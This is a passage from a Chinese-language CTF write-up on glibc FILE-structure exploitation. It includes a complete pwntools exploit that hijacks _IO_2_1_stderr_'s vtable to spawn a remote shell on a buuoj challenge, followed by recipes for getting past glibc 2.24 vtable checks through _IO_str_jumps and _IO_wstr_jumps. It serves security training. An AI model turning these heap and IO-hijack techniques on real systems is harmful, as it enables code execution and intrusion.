时溢出 8 bit 刚好可以覆盖堆指针：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210201615.png" alt="image-20201210201615356"></p><p>结合 edit 可以多次修改堆指针，实现任意地址多次写入：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210201739.png" alt="image-20201210201739661"></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>myexit 函数有关闭 stdout、stderr 后执行 exit() ，exit() 时系统会调用 _IO_flush_all_lockp 。修改堆指针到 _IO_2_1_stderr_ ，布置绕过绕过需要的数据；在适当位置写入 system ，将 vtable 劫持到这个空间上，完成劫持 _IO_flush_all_lockp 为 system 。写入 _IO_2_1_stderr_ 时将 /bin/sh 写到 _IO_FILE 的头部，调用虚函数时 _IO_FILE 是第一个参数。</p><blockquote><p>因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入 _IO_FILE_plus 头部。</p></blockquote><p><strong>调试查看结构体</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *((struct [结构体类型]*)[地址])</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)<span class="comment">#,terminal=[&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_n_7&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28957</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_n_7&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;-&gt; \n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name, content</span>):</span></span><br><span class="line">    command(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;New Author name:\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;New contents:\n&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">command(<span class="number">666</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line"><span class="comment"># log.info(&quot;IO_list_all:&quot;+hex(IO_list_all))</span></span><br><span class="line">IO_2_1_stderr=libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+libc_base</span><br><span class="line">log.info(<span class="string">&quot;IO_2_1_stderr:&quot;</span>+<span class="built_in">hex</span>(IO_2_1_stderr))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xf8</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(IO_2_1_stderr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0xb02)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define writebase_offset 0x20   -&gt;0</span></span><br><span class="line"><span class="comment">#define writeptr_offset 0x28    -&gt;1</span></span><br><span class="line"><span class="comment">#define mode_offset 0xc0        -&gt;0</span></span><br><span class="line"><span class="comment">#define vtable_offset 0xd8      -&gt;system&amp;onegadget</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(system)*<span class="number">4</span><span class="comment">#p64(libc_base+0x4526a)*4#0x50-0x70</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(IO_2_1_stderr+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="string">&#x27;a\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">command(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="glibc-2-24-利用"><a href="#glibc-2-24-利用" class="headerlink" title="glibc 2.24 利用"></a>glibc 2.24 利用</h2><h3 id="新增防御机制"><a href="#新增防御机制" class="headerlink" title="新增防御机制"></a>新增防御机制</h3><p>glibc 2.24 后新增 vtable 检查函数：IO_validate_vtable 和 _IO_vtable_check 。</p><blockquote><p>libio/libioP.h</p><p>libio/vtables.c</p></blockquote><p>vtables 被放进了专用的只读的 <code>__libc_IO_vtables</code> 段，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用 _IO_vtable_check 。</p><p>很多对 vtable 的攻击方式不再适用，思路转向 stream_buffer </p><h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><p>libc 中不仅仅只有 _IO_file_jumps 一个 vtable ，还有一个叫 _IO_str_jumps 的 ，这个 vtable 不在 check 范围之内。</p><p>比如 <code>_IO_str_jumps</code>（该符号在strip后会丢失）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/strops.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)</span></span><br></pre></td></tr></table></figure><p><code>_IO_str_jumps</code> 中包含了一个叫做 <code>_IO_str_overflow</code> 的函数，该函数中存在相对地址的引用（可伪造）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))                       <span class="comment">// 条件 #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;                                 <span class="comment">// 通过计算 new_size 为 &quot;/bin/sh\x00&quot; 的地址</span></span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);     <span class="comment">// 在这个相对地址放上 system 的地址，即 system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    [...]</span><br><span class="line"><span class="comment">// libio/strfile.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_flags = 0</li><li>fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2</li><li>fp-&gt;_IO_write_ptr = 0xffffffff</li><li>fp-&gt;_IO_write_base = 0</li><li>fp-&gt;_mode = 0</li></ul><p>有一点要注意的是，如果 bin_sh_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system(“/bin/sh”) 是可以用 one_gadget 来代替的，这样似乎更加简单。</p><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow</code>。</p><p>与传统的 house-of-orange 不同的是，这种利用方法不再需要知道 heap 的地址，因为 <code>_IO_str_jumps</code> vtable 是在 libc 上的，所以只要能泄露出 libc 的地址就可以了。</p><p>在 <code>_IO_str_jumps</code> 中，还有另一个函数 <code>_IO_str_finish</code>，它的检查条件比较简单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))             <span class="comment">// 条件</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);     <span class="comment">// 在这个相对地址放上 system 的地址</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要在 <code>fp-&gt;_IO_buf_base</code> 放上 “/bin/sh” 的地址，然后设置 <code>fp-&gt;_flags = 0</code> 就可以了绕过函数里的条件。</p><p>那么怎样让程序进入 <code>_IO_str_finish</code> 执行呢，<code>fclose(fp)</code> 是一条路，但似乎有局限。还是回到异常处理上来，在 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW</code> 执行的 <code>__GI__IO_str_overflow</code>，而 <code>_IO_OVERFLOW</code> 是根据 <code>__overflow</code> 相对于 <code>_IO_str_jumps</code> vtable 的偏移找到具体函数的。所以如果我们伪造传递给 <code>_IO_OVERFLOW(fp)</code> 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 <code>_IO_str_finish</code> 并执行。</p><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_mode = 0</li><li>fp-&gt;_IO_write_ptr = 0xffffffff</li><li>fp-&gt;_IO_write_base = 0</li><li>fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</li><li>fp-&gt;_flags2 = 0</li><li>fp-&gt;_mode = 0</li></ul><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish</code>。</p><h3 id="IO-wstr-jumps"><a href="#IO-wstr-jumps" class="headerlink" title="_IO_wstr_jumps"></a>_IO_wstr_jumps</h3><p><code>_IO_wstr_jumps</code> 也是一个符合条件的 vtable，总体上和上面讲的 <code>_IO_str_jumps</code> 差不多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/wstrops.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstr_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>利用函数 <code>_IO_wstr_overflow</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">_IO_wint_t</span><br><span class="line">_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == WEOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : WEOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))    <span class="comment">// 条件 #define _IO_wblen(fp) ((fp)-&gt;_wide_data-&gt;_IO_buf_end - (fp)-&gt;_wide_data-&gt;_IO_buf_base)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">wchar_t</span> *new_buf;</span><br><span class="line">      <span class="keyword">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;              <span class="comment">// 使 new_size * sizeof(wchar_t) 为 &quot;/bin/sh&quot; 的地址</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">          || __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="keyword">sizeof</span> (<span class="keyword">wchar_t</span>)))</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">wchar_t</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size</span><br><span class="line">                                    * <span class="keyword">sizeof</span> (<span class="keyword">wchar_t</span>));                      <span class="comment">// 在这个相对地址放上 system 的地址</span></span><br><span class="line">    [...]</span><br></pre></td></tr></table></figure><p>利用函数 <code>_IO_wstr_finish</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_wstr_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    <span class="comment">// 条件</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_wide_data-&gt;_IO_buf_base);     <span class="comment">// 在这个相对地址放上 system 的地址</span></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改-dl-fini-函数指针"><a href="#修改-dl-fini-函数指针" class="headerlink" title="修改 _dl_fini 函数指针"></a>修改 _dl_fini 函数指针</h3><p>以 hctf2018_the_end 为例子，题目部署在 Ubuntu 18，远程实验到 buu 。</p><blockquote><p>这条题目在 Ubuntu 18 下有 vtable 检查，修改 vtable 方法失效。</p><p>下面调试过程中寻找 libc 与 ld 偏移时与 buu 靶机情况不一样，因为我们本地在 docker 改 libc 运行 ld 和 libc 位置变化了，具体看后文</p></blockquote><p>exit() 函数的利用链：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212231817.png" alt="exit()"></p><p>在 exit 函数中会调用 <code>__run_exit_handlers()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/stdlib/exit.c</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>__run_exit_handlers() 调用 _dl_fini ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212231929.png" alt="image-20201212231929231"></p><p>在 _dl_fini 函数中调用调用函数 <code>__rtld_lock_lock_recursive()</code> 和 <code>__rtld_lock_unlock_recursive()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/elf/dl-fini.c</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = 